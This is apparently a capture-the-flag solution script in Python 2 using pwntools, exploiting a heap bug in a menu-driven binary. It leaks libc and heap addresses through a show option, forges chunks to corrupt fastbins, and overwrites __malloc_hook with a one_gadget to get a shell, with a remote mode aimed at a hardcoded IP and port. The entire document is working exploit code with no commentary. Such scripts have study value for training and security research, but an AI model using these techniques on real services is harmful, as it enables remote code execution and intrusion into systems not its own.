#!/usr/bin/env python2

from pwn import *
from qpwn import *
context(os='linux', log_level='debug')
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if args.INFO:
    context.log_level = 'info'
    
DEBUG = not args.REMOTE and not args.TEST
if args.REMOTE:
    p = remote('47.97.253.115', 10002)
    libc = ELF('./libc.so.6')
elif args.TEST:
    p = process('./pwn', env={'LD_PRELOAD': './libc.so.6'})
    libc = ELF('./libc.so.6')
else:
    p = process('./pwn')
    libc = ELF('./libc-2.23.so')
elf = ELF('./pwn')
init(p, elf, context, args)
make_alias(p)

def menu(index):
    p.sla('choice:', str(index))

def create(index, size, content):
    menu(1)
    p.sla('index:', str(index))
    p.sla('size:', str(size))
    p.sa('info:', content)

def show(index):
    menu(2)
    p.sla('index: ', str(index))

def delete(index):
    menu(3)
    p.sla('index:', str(index))

if __name__ == '__main__':
    create(0, 0x1000, 'a')
    create(1, 0x200, 'a')
    delete(0)
    create(0, 0x200, 'b')
    #gdb.attach(p)
    show(0)
    p.r(8)
    main_arena_addr = u64(p.r(8))
    heap_base = u64(p.r(8))
    libc.address = main_arena_addr - 0x7fde4fc14198 + 0x00007fde4f84f000
    success('main ' + hex(main_arena_addr))
    success('heap ' + hex(heap_base))
    success('libc ' + hex(libc.address))
    delete(0)
    delete(1)

    create(0, heap_base + 0x100, 'a')
    create(0, 0x200, 'a')
    create(1, 0x200, 'b')
    delete(0)
    create(0, 0x100, 'b')
    show(0)
    p.r(8)
    thread_heap_addr = u64(p.r(8)) + 0x8b0 - 0x278
    success('thread_heap ' + hex(thread_heap_addr))
    delete(0)
    delete(1)

    create(0, 0x28, flat(0x0, 0x20, thread_heap_addr+0x10, thread_heap_addr+0x10, 0x20))
    create(1, 0xf8, 'a')
    create(2, 0x18, 'a')
    delete(1)
    create(1, thread_heap_addr + 0x30 + 8 + 1, '\n')
    create(1, 0xf8, 'a')
    delete(1)
    create(1, 0x68, 'a')
    delete(1)
    delete(0)
    create(0, 0x28, flat(0x0, 0x75, libc.sym['__malloc_hook'] - 0x23))
    create(1, 0x68, 'a')
    one_gadget = libc.address + 0xf1147
    delete(2)
    create(2, 0x68, flat('a' * 0x13, one_gadget))
    #create(2, thread_heap_addr - 0x7ffff00008b0 + 0x7ffff0000050, '\n')
    #create(0, 0x68, 'a')
    #create(1, 0x68, flat('\x00' * 0x13, 0xdeadbeef))
    #create(0)
    #gogogo('x /50gx 0x7ffff00008b0\nx /20gx 0x0000555555756050')
    bc(one_gadget)
    delete(2)

    #bc(one_gadget)

    #menu(3)
    #p.sla('index:', str(2))
    p.i()
